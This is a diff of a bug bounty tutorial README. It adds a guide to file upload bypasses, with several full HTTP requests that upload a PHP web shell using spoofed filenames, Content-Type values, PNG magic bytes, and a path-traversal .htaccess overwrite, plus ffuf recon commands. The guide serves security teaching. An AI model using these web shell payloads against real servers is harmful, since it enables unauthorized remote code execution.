@@ -1,114 +1,176 @@
-﻿# 🐞 Bug Bounty Hunter Mindset v1.0
+# Bug Bounty Hunting Mindset v1.0
 
----
+<h2 align="center"><strong>Bug Bounty Hunting Mindset v1.0</strong></h2>
 
-## 📌 Introduction
+<p align="center">A focused and practical resource for bug bounty hunters, penetration testers, and red teamers — covering real-world techniques, bypasses, and offensive security insights.</p>
 
-This project contains useful ideas and tools for bug bounty hunting.  
-It’s created for my own use but shared publicly so others can benefit too.
+***
 
----
+<h3 align="center"><strong>Vulnerabilities &#x26; Bypasses:</strong></h3>
 
-## 🛠️ Creating Custom Wordlists for Bug Bounty Targets: A Complete Guide
+{% hint style="info" %}
+<p align="center">A collection of known vulnerability types with practical methods to bypass filters, protections, and common security mechanisms.</p>
+{% endhint %}
 
-### 🔹 Step 1: Generating a Company-Specific Wordlist
+#### <sup>**V01.**</sup>**&#x20;Insecure file uploads: A complete guide to finding advanced file upload vulnerabilities:**
 
-- **Extracting in-page keywords**
+1. **Identifying file upload vulnerabilities**
+   1. Retrievable
+   2. Content-Type
+2. **Exploiting simple file upload vulnerabilities**
+   1. No restrictions
 
-  - **Command:**
-    ```bash
-    cewl https://example.com --header "Cookie: PHPSESSID=7a9b4c2d8e3f1g5h6i7j8k9l0m1n2o3p" -d 5 -m 4
-    ```
-  - **Tool:** [CeWL - GitHub Repository](https://github.com/digininja/CeWL)
+```http
+POST /Api/FileUpload.aspx HTTP/2
+Host: console.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
+Accept: */*
 
-- **Extracting URL keywords**
+------WebKitFormBoundary3RwPFJztxaJvrqAq
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/x-php
 
-  - **Command:**
-    ```bash
-    cat /path/to/urls.txt | tok
-    ```
-  - **Tool:** [tok by tomnomnom - GitHub](https://github.com/tomnomnom/hacks/tree/master/tok)
-
-- **Extracting keywords from JavaScript files**
-  - **Command:**
-    ```bash
-    cat /path/to/js-urls.txt | python3 getjswords.py
-    ```
-  - **Tool:** [getjswords.py - GitHub (BBTz by m4ll0k)](https://github.com/m4ll0k/BBTz/blob/master/getjswords.py)
-
-### 🔹 Step 2: Crafting a Technology-Specific Wordlist
-
-- Use wordlists from **SecLists**:  
-  🔗 [SecLists - GitHub Repository](https://github.com/danielmiessler/SecLists)
-
-### 🔹 Step 3: Including Commonly Occurring Keywords
-
-- Use the file `all.txt` from **JHaddix**:  
-  🔗 [JHaddix's all.txt - Gist](https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056)
-
-### 🔹 Step 4: Combining All Lists
-
-- Combine all wordlists into one final file:
-  ```bash
-  cat list1.txt list2.txt list3.txt > all_word-lists.txt
-  ```
-
----
-
-### 🔍 json2paths
-
-This tool finds hidden endpoints, especially on APIs. It fetches JSON responses from BurpSuite history and creates url-paths wordlist from JSON keys.  
-**Tool:** [json2paths - GitHub Repository](https://github.com/s0md3v/dump/tree/master/json2paths)
-![j2p image](images/j2p.png)
-
-Installation:
-
-```bash
-pip3 install json2paths
+<?php echo system($_GET['e']); ?>
+------WebKitFormBoundary3RwPFJztxaJvrqAq--
 ```
 
-**📤 Exporting BurpSuite History:**
+* Bypassing client-side restrictions
+  * HTML "accept" attribute
+  * using proxy interceptors
+* Bypassing a file extension blacklist
 
-To export responses from BurpSuite:
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-1. Select the responses you want **or select all responses**.
-2. Right-click the selection.
-3. Choose **"Save items..."** from the context menu.
-4. In the dialog, make sure **Base64 encoding is disabled**.
+<p align="center">Bypass file extension exclusion lists</p>
 
-### 🚀 **Usage**
+* Bypassing a file extension whitelist
 
-Run the tool on your exported history file to generate a wordlist of API paths from JSON keys.
-For more details... try it out and explore! 😉
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-```bash
-Usage: j2p <options> <prefix>+<path to burp-file>
+<p align="center">Bypass file extension inclusion lists</p>
 
-Available options:
-  p: print paths
-  k: print keys
+If the file upload implementation determines your file type by the content type, you can also attempt to upload a file with a whitelisted file extension but with your malicious content type:
 
-<prefix>+ and <options> are optional.
+```http
+POST /Api/FileUpload.aspx HTTP/2
+Host: console.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
+Accept: */*
 
-Examples:
-  > j2p -p test.txt
-  > j2p -pk /+test.txt
+------WebKitFormBoundary3RwPFJztxaJvrqAq
+Content-Disposition: form-data; name="file"; filename="shell.png"
+Content-Type: application/x-php
+
+<?php echo system($_GET['e']); ?>
+------WebKitFormBoundary3RwPFJztxaJvrqAq--
 ```
 
----
+<p align="center">Take note of the <mark style="color:red;">filename</mark> and <mark style="color:red;">Content-Type</mark> in the example request above.</p>
 
-## **Note: I will keep it updated always (Insha'Allah) 😊✨**
+3. **Exploiting advanced file upload vulnerabilities**
 
----
+* Bypassing content type restrictions
 
-## **🧑‍💻 Author & Socials**
+```http
+POST /Api/FileUpload.aspx HTTP/2
+Host: console.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
+Accept: */*
 
-You can follow and connect with me through the following link:
-[All Links:](https://linktr.ee/1ZeroDay) 🌐.
+------WebKitFormBoundary3RwPFJztxaJvrqAq
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/png
 
----
+<?php echo system($_GET['e']); ?>
+------WebKitFormBoundary3RwPFJztxaJvrqAq--
+```
 
-## 📄 License
+* Magic bytes
+  *   These are the magic bytes for a normal image (PNG) in HEX:
 
-This project is licensed under the  
-[Creative Commons Attribution 4.0 International (CC BY 4.0) License](https://creativecommons.org/licenses/by/4.0/).
+      `89 50 4E 47 0D 0A 1A 0A`
+
+```http
+POST /Api/FileUpload.aspx HTTP/2
+Host: console.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
+Accept: */*
+
+------WebKitFormBoundary3RwPFJztxaJvrqAq
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/x-php
+
+‰PNG␍␊␚␊
+<?php echo system($_GET['e']); ?>
+------WebKitFormBoundary3RwPFJztxaJvrqAq--
+```
+
+<p align="center"><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">List of file signatures - Wikipedia</a></p>
+
+* Overwriting server configuration files
+  * .htaccess
+
+```http
+POST /Api/FileUpload.aspx HTTP/2
+Host: console.example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
+Accept: */*
+
+------WebKitFormBoundary3RwPFJztxaJvrqAq
+Content-Disposition: form-data; name="file"; filename="../../../.htaccess"
+Content-Type: text/plain
+
+# Your server configuraton rules
+------WebKitFormBoundary3RwPFJztxaJvrqAq--
+```
+
+***
+
+#### <sup>**V02.**</sup> &#x20;
+
+
+
+
+
+***
+
+<h3 align="center"><strong>Hunting Techniques &#x26; Ideas:</strong></h3>
+
+{% hint style="info" %}
+<p align="center">General strategies, techniques, and creative approaches to help you discover more bugs and uncover hidden attack surfaces.</p>
+{% endhint %}
+
+#### <sup>**T01.**</sup>**&#x20;7 Overlooked recon techniques to find more vulnerabilities:**
+
+1. **Targeted wordlists**
+   1. [CeWL](https://github.com/digininja/CeWL)
+2. **Virtual host (VHost) enumeration**
+
+```sh
+ffuf -u https://example.com -H "Host: FUZZ.example.com" -w /path/to/wordlist
+```
+
+3. **Forced browsing using different HTTP methods**
+
+```sh
+ffuf -u https://api.example.com/PATH -X METHOD -w /path/to/wordlist:PATH -w /path/to/http_methods:METHOD
+```
+
+4. **JavaScript file monitoring**
+   1. [JSMON](https://github.com/robre/jsmon)
+5. **Crawling with different user-agent headers**
+   1. <kbd>Proxy → Proxy settings → Tools → Proxy → HTTP match and replace rules</kbd>
+6. **Finding related assets with favicon hashes**
+   1. [Shodan](https://www.shodan.io/)
+   2. [Censys](https://search.censys.io/)
+7. **Looking up legacy versions of JavaScript files**
+   1. [internet archives](https://archive.org/)
+
+***
+
+#### <sup>**T02.**</sup> &#x20;
